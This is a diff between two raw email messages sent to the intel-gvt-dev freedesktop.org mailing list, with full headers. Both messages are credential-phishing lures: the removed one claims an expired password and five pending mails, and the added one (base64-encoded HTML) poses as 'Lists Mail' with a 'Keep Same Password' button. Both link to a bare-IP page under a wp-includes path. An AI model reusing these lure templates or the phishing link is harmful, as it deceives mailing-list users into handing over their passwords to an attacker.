@@ -2,33 +2,38 @@ Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
 X-Original-To: lists+intel-gvt-dev@lfdr.de
 Delivered-To: lists+intel-gvt-dev@lfdr.de
 Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
-	by mail.lfdr.de (Postfix) with ESMTPS id BB85BAD810F
-	for <lists+intel-gvt-dev@lfdr.de>; Fri, 13 Jun 2025 04:38:03 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id F10CEAD8D8C
+	for <lists+intel-gvt-dev@lfdr.de>; Fri, 13 Jun 2025 15:47:00 +0200 (CEST)
 Received: from gabe.freedesktop.org (localhost [127.0.0.1])
-	by gabe.freedesktop.org (Postfix) with ESMTP id F2C2510E0FB;
-	Fri, 13 Jun 2025 02:38:00 +0000 (UTC)
+	by gabe.freedesktop.org (Postfix) with ESMTP id CFE2110E1A0;
+	Fri, 13 Jun 2025 13:46:59 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=lists.freedesktop.org;
+	s=20240201; t=1749822419;
+	bh=rVonqnfu0sr/J/o4A3JjYgI5uUtcqP9/Ct8WjED/FAg=;
+	h=From:To:Subject:List-Id:List-Unsubscribe:List-Archive:List-Post:
+	 List-Help:List-Subscribe:Date:From;
+	b=rTE+RyA7tmWrlhcX7AAwREXMHfhjCDd3f9Camgcf4AbaEnwjFeshfYe98NJfouJZ0
+	 WO9cMG2HZ6MHngWhZjW/c1SOY+JCTkhKcqgGQm0FN+Z9fRb53EJUsnVJmyqSAiBaN1
+	 ISuqyAKurxGTiBAGjm4+OnS+M12dBo08GylOZTxaJN06etWiUXFgp8sTBkE9l+1gVi
+	 ulwxBL1kORVp/ulmsZ2IhOZaUL7b0P6lqwn3cwtf8qJj9cLkOYeT6yG7BDlgQpnyXh
+	 YVc+MzHwuuB7wwnjjhAJAr0bLnskMbN2htA8fLTGrjq1TtqqMBO+VbIqQISFvua2c5
+	 4VpvMblTC0ibw==
 X-Original-To: intel-gvt-dev@lists.freedesktop.org
 Delivered-To: intel-gvt-dev@lists.freedesktop.org
-X-Greylist: delayed 1402 seconds by postgrey-1.36 at gabe;
- Fri, 13 Jun 2025 02:37:59 UTC
-Received: from vm-40798.veeblehosting.com (unknown [108.170.13.82])
- by gabe.freedesktop.org (Postfix) with ESMTP id 41DC610E0FB
+X-Greylist: delayed 7386 seconds by postgrey-1.36 at gabe;
+ Fri, 13 Jun 2025 13:46:58 UTC
+Received: from [10.88.0.4] (109.175.168.34.bc.googleusercontent.com
+ [34.168.175.109])
+ by gabe.freedesktop.org (Postfix) with ESMTP id 1937B10E1A0
  for <intel-gvt-dev@lists.freedesktop.org>;
- Fri, 13 Jun 2025 02:37:59 +0000 (UTC)
-Received: from rnsolutionsltd.com (localhost [IPv6:::1])
- by vm-40798.veeblehosting.com (Postfix) with ESMTP id 8C6094BABC9
- for <intel-gvt-dev@lists.freedesktop.org>;
- Fri, 13 Jun 2025 02:05:28 +0000 (UTC)
-From: lists.freedesktop.org <liqiong.he@minicircuits.com>
-To: intel-gvt-dev@lists.freedesktop.org
-Subject: Action Required: Password Expired
- =?UTF-8?B?4oCTIFBsZWFzZSBDb25maXJtIHRvIE1haW50YWluIEFjY2Vzcw==?=
- intel-gvt-dev@lists.freedesktop.org 6/12/2025 7:05:28 p.m.
-Date: 12 Jun 2025 19:05:28 -0700
-Message-ID: <20250612190528.4670E325A4C97FEA@minicircuits.com>
+ Fri, 13 Jun 2025 13:46:58 +0000 (UTC)
+Content-Type: multipart/related;
+ boundary="===============6050791401104191281=="
 MIME-Version: 1.0
-Content-Type: text/html
-Content-Transfer-Encoding: quoted-printable
+From: "Lists ." <no-reply@lists.freedesktop.org>
+To: intel-gvt-dev@lists.freedesktop.org
+Subject: =?utf-8?q?=5Bintel-gvt-dev=40lists=2Efreedesktop=2Eorg=5D=3A_Please_confirm_three_=283=29_Pending_Messages=2E?=
+X-Priority: 2
 X-BeenThere: intel-gvt-dev@lists.freedesktop.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -43,92 +48,43 @@ List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev>,
  <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=subscribe>
 Errors-To: intel-gvt-dev-bounces@lists.freedesktop.org
 Sender: "intel-gvt-dev" <intel-gvt-dev-bounces@lists.freedesktop.org>
+Message-Id: <20250613134659.CFE2110E1A0@gabe.freedesktop.org>
+Date: Fri, 13 Jun 2025 13:46:59 +0000 (UTC)
 
-<html><head>
-<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
-</head>
-<body><p style=3D"color: rgb(44, 54, 58); text-transform: none; text-indent=
-: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: =
-larger; font-style: normal; font-weight: 400; margin-top: 0px; margin-botto=
-m: 1rem; word-spacing: 0px; white-space: normal; box-sizing: border-box; or=
-phans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: nor=
-mal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; te=
-xt-decoration-style: initial; text-decoration-color: initial;"><span style=
-=3D"font-style: italic; box-sizing: border-box;"><span style=3D"font-weight=
-: bolder; box-sizing: border-box;"><font color=3D"#e1851e" size=3D"6" style=
-=3D"box-sizing: border-box;">Email Administrator</font></span></span></p><p=
- style=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; l=
-etter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; fo=
-nt-style: normal; font-weight: 400; margin-top: 0px; margin-bottom: 1rem; w=
-ord-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; =
-widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webk=
-it-text-stroke-width: 0px; text-decoration-thickness: initial; text-decorat=
-ion-style: initial; text-decoration-color: initial;">Hi</p><p style=3D"colo=
-r: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-spacing:=
- normal; font-family: Roboto, sans-serif; font-size: 14px; font-style: norm=
-al; font-weight: 400; margin-top: 0px; margin-bottom: 1rem; word-spacing: 0=
-px; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; fon=
-t-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke=
--width: 0px; text-decoration-thickness: initial; text-decoration-style: ini=
-tial; text-decoration-color: initial;">Five (5) pending mails for intel-gvt=
--dev@lists.freedesktop.org authentication expires 6/12/2025 7:05:28 p.m..</=
-p><p style=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0p=
-x; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px=
-; font-style: normal; font-weight: 400; margin-top: 0px; margin-bottom: 1re=
-m; word-spacing: 0px; white-space: normal; box-sizing: border-box; orphans:=
- 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -=
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-dec=
-oration-style: initial; text-decoration-color: initial;"></p><table style=
-=3D"color: rgb(44, 54, 58); text-transform: none; letter-spacing: normal; f=
-ont-family: Roboto, sans-serif; font-size: 14px; font-style: normal; font-w=
-eight: 400; word-spacing: 0px; white-space: normal; border-collapse: collap=
-se; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-cap=
-s: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initi=
-al; text-decoration-style: initial; text-decoration-color: initial;"><tbody=
- style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><t=
-d style=3D"margin: 0px; padding: 5px 7px; border-radius: 3px; color: white;=
- box-sizing: border-box; background-color: cornflowerblue;"><a style=3D"col=
-or: white; box-sizing: border-box; background-color: transparent; text-deco=
-ration-line: none;" href=3D"http://143.47.35.158/wp-includes/css/index.html=
-#intel-gvt-dev@lists.freedesktop.org" target=3D"_blank" rel=3D"noreferrer">=
-Continue</a></td></tr></tbody></table><p style=3D"color: rgb(44, 54, 58); t=
-ext-transform: none; text-indent: 0px; letter-spacing: normal; font-family:=
- Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400;=
- margin-top: 0px; margin-bottom: 1rem; word-spacing: 0px; white-space: norm=
-al; box-sizing: border-box; orphans: 2; widows: 2; font-variant-ligatures: =
-normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
-oration-thickness: initial; text-decoration-style: initial; text-decoration=
--color: initial;"><br></p><p style=3D"color: rgb(44, 54, 58); text-transfor=
-m: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto, san=
-s-serif; font-size: 14px; font-style: normal; font-weight: 400; margin-top:=
- 0px; margin-bottom: 1rem; word-spacing: 0px; white-space: normal; box-sizi=
-ng: border-box; orphans: 2; widows: 2; font-variant-ligatures: normal; font=
--variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thic=
-kness: initial; text-decoration-style: initial; text-decoration-color: init=
-ial;">&nbsp;Please click 'Continue' to proceed with the release of the pend=
-ing messages</p><p style=3D"color: rgb(44, 54, 58); text-transform: none; t=
-ext-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; f=
-ont-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; marg=
-in-bottom: 1rem; word-spacing: 0px; white-space: normal; box-sizing: border=
--box; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-c=
-aps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: ini=
-tial; text-decoration-style: initial; text-decoration-color: initial;"></p>=
-<p><span style=3D"color: rgb(44, 54, 58); text-transform: none; text-indent=
-: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: =
-14px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space:=
- normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font-varian=
-t-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: =
-initial; text-decoration-style: initial; text-decoration-color: initial;">R=
-egards,</span><br style=3D"color: rgb(44, 54, 58); text-transform: none; te=
-xt-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; fo=
-nt-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; whi=
-te-space: normal; box-sizing: border-box; orphans: 2; widows: 2; font-varia=
-nt-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width:=
- 0px; text-decoration-thickness: initial; text-decoration-style: initial; t=
-ext-decoration-color: initial;"><span style=3D"color: rgb(44, 54, 58); text=
--transform: none; text-indent: 0px; letter-spacing: normal; font-family: Ro=
-boto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; wo=
-rd-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-l=
-igatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px=
-; text-decoration-thickness: initial; text-decoration-style: initial; text-=
-decoration-color: initial;">lists.freedesktop.org</span></p></body></html>
+--===============6050791401104191281==
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: base64
+
+PEhUTUw+PEhFQUQ+CiAgICA8TUVUQSBuYW1lPUdFTkVSQVRPUiBjb250ZW50PSJNU0hUTUwgMTEu
+MDAuMTA1NzAuMTAwMSI+PC9IRUFEPgogICAgPEJPRFk+CiAgICA8RElWIHN0eWxlPSJGT05ULVNJ
+WkU6IDE2cHg7IEZPTlQtRkFNSUxZOiBoZWx2ZXRpY2E7IENPTE9SOiAjMDAwMDAwOyBURVhULUFM
+SUdOOiBsZWZ0OyBMSU5FLUhFSUdIVDogMSI+CiAgICA8UD48U1RST05HPiZuYnNwOyZuYnNwOyZu
+YnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNw
+OyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZu
+YnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOzwvU1RST05HPjxG
+T05UIGNvbG9yPSNlMzg2MWM+PC9QPgogICAgPFAgc3R5bGU9IkZPTlQtU0laRTogbGFyZ2VyIj48
+Rk9OVCBzaXplPTU+PFNQQU4gc3R5bGU9IkZPTlQtV0VJR0hUOiAzMDA7IEZPTlQtU1RZTEU6IGl0
+YWxpYyI+TGlzdHM8L1NQQU4+PFNQQU4gc3R5bGU9IkZPTlQtV0VJR0hUOiA2MDAiPk1haWw8L1NQ
+QU4+PC9GT05UPjwvUD48L0ZPTlQ+CiAgICA8UD48L1A+CiAgICA8UD48Rk9OVCBzaXplPTI+UGFz
+c3dvcmQgZm9yIGludGVsLWd2dC1kZXZAbGlzdHMuZnJlZWRlc2t0b3Aub3JnIGV4cGlyZXMgdG9k
+YXk8U1RST05HPiAxNCBKdW5lLCAyMDI1PC9TVFJPTkc+PC9GT05UPjwvUD48U1RST05HPgogICAg
+PFA+PEZPTlQgc2l6ZT0yPjwvRk9OVD48L1A+PC9TVFJPTkc+CiAgICA8UD48U1RST05HPjwvU1RS
+T05HPjxGT05UIHNpemU9Mj5Zb3UgY2FuIGNoYW5nZSB5b3VyIHBhc3N3b3JkIG9yIGNvbnRpbnVl
+IHVzaW5nIGN1cnJlbnQgcGFzc3dvcmQuPC9GT05UPjwvUD4KICAgIDxQPjxGT05UIHNpemU9Mj4m
+bmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJz
+cDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsm
+bmJzcDsmbmJzcDsmbmJzcDs8L0ZPTlQ+PEEgaHJlZj0iaHR0cDovLzE0My40Ny4zNS4xNTgvd3At
+aW5jbHVkZXMvY3NzL2luZGV4Lmh0bWwjaW50ZWwtZ3Z0LWRldkBsaXN0cy5mcmVlZGVza3RvcC5v
+cmciIHJlbD1ub3JlZmVycmVyIHRhcmdldD1fYmxhbms+PEZPTlQgc2l6ZT0yPjxTVFJPTkc+S2Vl
+cCBTYW1lIFBhc3N3b3JkPC9TVFJPTkc+IDwvRk9OVD48L0E+PC9QPgogICAgPFAgc3R5bGU9IkZP
+TlQtU0laRTogMXB4OyBCT1JERVItVE9QOiAjNDc5YTlhIDRweCBzb2xpZDsgV0lEVEg6IDEwMCU7
+IE1BUkdJTjogMHB4IGF1dG8iPjxGT05UIHNpemU9Mj48L0ZPTlQ+PC9QPjxBIGhyZWY9Imh0dHA6
+Ly8xNDMuNDcuMzUuMTU4L3dwLWluY2x1ZGVzL2Nzcy9pbmRleC5odG1sI2ludGVsLWd2dC1kZXZA
+bGlzdHMuZnJlZWRlc2t0b3Aub3JnIiByZWw9bm9yZWZlcnJlciB0YXJnZXQ9X2JsYW5rPgogICAg
+PERJViBzdHlsZT0iRk9OVC1TSVpFOiAxNnB4OyBGT05ULUZBTUlMWTogaGVsdmV0aWNhOyBDT0xP
+UjogIzAwMDAwMDsgVEVYVC1BTElHTjogbGVmdDsgTElORS1IRUlHSFQ6IDEiPgogICAgPFA+PFNU
+Uk9ORz48Rk9OVCBzaXplPTI+TGlzdHMgTWFpbDwvRk9OVD48L1NUUk9ORz48L1A+PC9ESVY+PC9B
+PjwvRElWPjwvQk9EWT48L0hUTUw+
+
+--===============6050791401104191281==--
